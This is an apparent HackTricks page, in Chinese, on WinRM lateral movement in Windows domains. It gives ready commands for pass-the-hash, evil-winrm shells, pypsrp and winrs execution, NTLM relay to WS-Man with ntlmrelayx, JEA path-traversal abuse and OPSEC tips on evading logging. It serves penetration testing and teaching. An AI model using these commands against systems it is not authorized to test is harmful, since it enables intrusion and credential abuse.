# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM 是 Windows 环境中最方便的 **lateral movement** 传输方式之一，因为它能通过 **WS-Man/HTTP(S)** 提供远程 shell，无需使用 SMB 服务创建技巧。如果目标开放了 **5985/5986**，且你的主体获准使用远程管理，通常很快就能从“有效 creds”获得“交互式 shell”。

有关**协议/服务枚举**、监听器、启用 WinRM、`Invoke-Command` 以及通用客户端用法，请参阅：

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## 操作者为何喜欢 WinRM

- 使用 **HTTP/HTTPS** 而非 SMB/RPC，因此在 PsExec 风格的执行被阻止时，它往往仍然可用。
- 使用 **Kerberos** 时，无需向目标发送可重复使用的凭据。
- 可通过 **Windows**、**Linux** 和 **Python** 工具（`winrs`、`evil-winrm`、`pypsrp`、`netexec`）顺畅使用。
- 交互式 PowerShell remoting 会在目标上以已认证用户的上下文启动 **`wsmprovhost.exe`**，这在操作层面不同于基于服务的执行。

## 访问模型和前提条件

实际上，WinRM lateral movement 是否成功取决于**三**个条件：

1. 目标具有 **WinRM listener**（`5985`/`5986`），且防火墙规则允许访问。
2. 该账户可以向 endpoint **进行身份验证**。
3. 该账户获准**打开 remoting session**。

获得此访问权限的常见方式：

- 在目标上拥有 **Local Administrator** 权限。
- 在较新的系统上属于 **Remote Management Users**，或在仍支持该组的系统/组件上属于 **WinRMRemoteWMIUsers__**。
- 通过本地安全描述符显式委派 remoting 权限，或更改 PowerShell remoting ACL。

如果你已经控制了一台拥有管理员权限的主机，请记住，也可以使用此处介绍的技术，**在不加入完整管理员组的情况下委派 WinRM 访问权限**：

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### lateral movement 期间值得注意的身份验证问题

- **Kerberos 需要主机名/FQDN**。如果通过 IP 连接，客户端通常会回退到 **NTLM/Negotiate**。
- 在**工作组**或跨信任边界的特殊情况下，NTLM 通常需要使用 **HTTPS**，或在客户端将目标添加到 **TrustedHosts**。
- 在工作组中通过 Negotiate 使用**本地账户**时，UAC 远程限制可能会阻止访问，除非使用内置 Administrator 账户，或设置 `LocalAccountTokenFilterPolicy=1`。
- PowerShell remoting 默认使用 **`HTTP/<host>` SPN**。如果环境中 `HTTP/<host>` 已注册到其他服务账户，WinRM Kerberos 可能会因 `0x80090322` 而失败；此时可使用带端口的 SPN，或在存在 **`WSMAN/<host>`** SPN 时改用它。<sup>[[3]](#references)</sup>

如果你在 password spraying 过程中获得了有效凭据，通过 WinRM 验证它们通常是确认能否获得 shell 的最快方式：

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## 从 Linux 到 Windows 的 lateral movement

### 使用 NetExec / CrackMapExec 进行验证和一次性执行

```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```

### 用于交互式 shell 的 Evil-WinRM

`evil-winrm` 仍然是 Linux 上最方便的交互式选项，因为它支持**密码**、**NT 哈希**、**Kerberos 票据**、**客户端证书**、文件传输，以及在内存中加载 PowerShell/.NET。

```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```

### Kerberos SPN 边缘情况：`HTTP` 与 `WSMAN`

当默认的 **`HTTP/<host>`** SPN 导致 Kerberos 失败时，尝试改为请求/使用 **`WSMAN/<host>`** 票据。这种情况可能出现在经过加固或配置特殊的企业环境中，此时 **`HTTP/<host>`** 已关联到另一个服务帐户。<sup>[[3]](#references)</sup>

```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```

在滥用 **RBCD / S4U** 后，如果你专门伪造或请求了 **WSMAN** 服务票据，而不是通用的 `HTTP` 票据，这种方式也很有用。

### 基于证书的身份验证

WinRM 也支持**客户端证书身份验证**，但必须先在目标上将证书映射到一个**本地账户**。从攻击角度来看，以下情况会涉及这一点：

- 你已经窃取/导出了一个有效的客户端证书和私钥，且该证书已映射到 WinRM；
- 你滥用了 **AD CS / Pass-the-Certificate**，为某个主体获取证书，然后转入另一种身份验证路径；
- 你在刻意避免基于密码进行远程管理的环境中开展操作。

```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```

客户端证书 WinRM 远不如密码/hash/Kerberos auth 常见，但如果存在，它可以提供一条**无密码 lateral movement**路径，并且在密码轮换后仍然有效。

### 使用 `pypsrp` 进行 Python 自动化

如果你需要自动化而不是操作者 shell，`pypsrp` 可让你通过 Python 使用 WinRM/PSRP，并支持 **NTLM**、**证书 auth**、**Kerberos** 和 **CredSSP**。<sup>[[2]](#references)</sup>

```python
from pypsrp.client import Client

client = Client(
    "srv01.domain.local",
    username="DOMAIN\\user",
    password="Password123!",
    ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```


如果你需要比高层 `Client` wrapper 更精细的控制，较底层的 `WSMan` + `RunspacePool` API 对以下两类常见操作问题很有用：

- 强制将 **`WSMAN`** 用作 Kerberos service/SPN，而不是许多 PowerShell 客户端默认使用的 **`HTTP`**；
- 连接到**非默认 PSRP endpoint**，例如 **JEA** / 自定义 session configuration，而不是 `Microsoft.PowerShell`。

```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
    "srv01.domain.local",
    auth="kerberos",
    ssl=False,
    negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
    ps.add_script("whoami; Get-Command")
    output = ps.invoke()
    print(output)
```

### 自定义 PSRP endpoints 和 JEA 在横向移动中很重要

成功通过 WinRM 身份验证，**并不**总意味着你会进入默认的、不受限制的 `Microsoft.PowerShell` endpoint。成熟的环境可能会公开**自定义会话配置**或 **JEA** endpoints，并为其配置各自的 ACL 和 run-as 行为。<sup>[[1]](#references)</sup>

如果你已经能在 Windows 主机上执行代码，并想了解有哪些远程管理入口，可以枚举已注册的 endpoints：

```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```

当存在有用的 endpoint 时，应明确指定目标，而不是使用默认 shell：

```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```

实际攻击影响：

- 即使是 **restricted** endpoint，只要它暴露了恰当的 cmdlets/functions，用于服务控制、文件访问、进程创建或任意 .NET / 外部命令执行，就足以实现横向移动。
- **misconfigured JEA** role 尤其有价值，特别是暴露了危险命令（如 `Start-Process`）、宽泛通配符、可写 providers，或允许逃逸预期限制的自定义 proxy functions 时。
- 由 **RunAs virtual accounts** 或 **gMSAs** 支持的 endpoint 会改变所运行命令的有效安全上下文。尤其是，由 gMSA 支持的 endpoint 可以在 **second hop** 上提供 **network identity**，即使普通 WinRM session 会遇到经典的委派问题。

对于自定义受限 endpoint，应分别检查其有效命令权限和脚本权限：`Get-Command` 列表很短，并不能单独证明现有 `.ps1` 无法运行。[JEA role capabilities](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities) 明确控制可调用的脚本路径；其他自定义 endpoint 可能采用不同的 session 规则。如果获准运行的脚本使用存储的 `SecureString` 为另一台主机创建凭据，那么未显式指定密钥生成的 blob 会使用 [Windows DPAPI](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring)，通常需要保护该数据的用户和机器上下文才能解密。在将可写源代码或复制的 blob 视为跨主机提权路径之前，应检查脚本的 ACL、允许的调用方式、run-as identity，以及下游凭据权限。被动枚举时不要打印受保护的值。

对于接受文件路径的 JEA 自定义函数，应结合检查已注册 endpoint 的 ACL、映射的 role capability，以及有效的 run-as identity。调用者可能处于 `NoLanguage` 模式，而函数主体运行在系统默认语言模式下；virtual account 也可能拥有本地管理员权限。如果函数通过原始字符串前缀检查允许的目录，之后又读取所提供的路径，那么 `..` 组件可能会解析到该目录之外。边界应以函数身份下解析后的路径为准，而不是调用者的语言模式或表面上的前缀。在将可读取的 `.psrc` 或 `.pssc` 文件视为特权文件读取发现之前，应确认可访问的函数以及它对最终路径的验证。参见 Microsoft 关于 [JEA role capability](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities) 和[安全注意事项](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations)的指南。

## Windows 原生 WinRM 横向移动

### `winrs.exe`

`winrs.exe` 是内置工具；如果你想在不打开交互式 PowerShell remoting session 的情况下执行 **原生 WinRM 命令**，它就很有用：

```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```

有两个标志很容易被忽略，而且在实际操作中很重要：

- 当远程主体**不是**本地管理员时，通常需要使用 `/noprofile`。
- `/allowdelegate` 允许远程 shell 使用你的凭据访问**第三台主机**（例如，命令需要访问 `\\fileserver\share` 时）。

```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```

在实际操作中，`winrs.exe` 通常会产生类似如下的远程进程链：

```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```

这一点值得记住，因为它与基于服务的 exec 和交互式 PSRP 会话不同。

### `winrm.cmd` / WS-Man COM，而非 PowerShell remoting

你也可以通过 **WinRM transport** 执行命令，而不使用 `Enter-PSSession`：通过 WS-Man 调用 WMI 类。这样传输仍使用 WinRM，而远程执行原语则变为 **WMI `Win32_Process.Create`**：

```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```

当以下情况时，这种方法很有用：

- PowerShell 日志受到严格监控。
- 你想使用 **WinRM 传输**，但不采用经典的 PS remoting 工作流。
- 你正在围绕 **`WSMan.Automation`** COM 对象构建或使用自定义工具。

## NTLM relay 到 WinRM (WS-Man)

当 SMB relay 因签名而被阻止，且 LDAP relay 受到限制时，**WS-Man/WinRM** 仍可能是一个有吸引力的 relay 目标。新版 `ntlmrelayx.py` 内置了 **WinRM relay 服务器**，可以 relay 到 **`wsman://`** 或 **`winrms://`** 目标。

```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```

两个实用注意事项：

- 当目标接受 **NTLM**，且被 relay 的主体获准使用 WinRM 时，Relay 最有用。
- 最新的 Impacket 代码会专门处理 **`WSMANIDENTIFY: unauthenticated`** 请求，因此 `Test-WSMan` 风格的探测不会中断 relay 流程。

首次建立 WinRM 会话后，如需了解多跳限制，请参阅：

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC 和检测注意事项

- **交互式 PowerShell 远程处理**通常会在目标上创建 **`wsmprovhost.exe`**。
- **`winrs.exe`** 通常会创建 **`winrshost.exe`**，然后再创建请求的子进程。
- 自定义 **JEA** 端点可能以 **`WinRM_VA_*`** 虚拟帐户或配置的 **gMSA** 执行动作。与普通用户上下文 shell 相比，这会改变遥测信息和第二跳行为。<sup>[[1]](#references)</sup>
- 如果使用 PSRP 而非原始 `cmd.exe`，预期会产生 **网络登录**遥测、WinRM 服务事件，以及 PowerShell 操作日志/脚本块日志。
- 如果只需要执行单条命令，`winrs.exe` 或一次性 WinRM 执行可能比长时间运行的交互式远程会话更安静。
- 如果 Kerberos 可用，优先使用 **FQDN + Kerberos**，而非 IP + NTLM，以减少信任问题和客户端侧繁琐的 `TrustedHosts` 配置变更。

## References

- [1] [Microsoft：JEA 安全注意事项](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [2] [pypsrp README](https://github.com/jborean93/pypsrp)
- [3] [Microsoft：通过 WinRM 将 PowerShell 连接到远程服务器时出现错误 `0x80090322`](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)
{{#include ../../banners/hacktricks-training.md}}
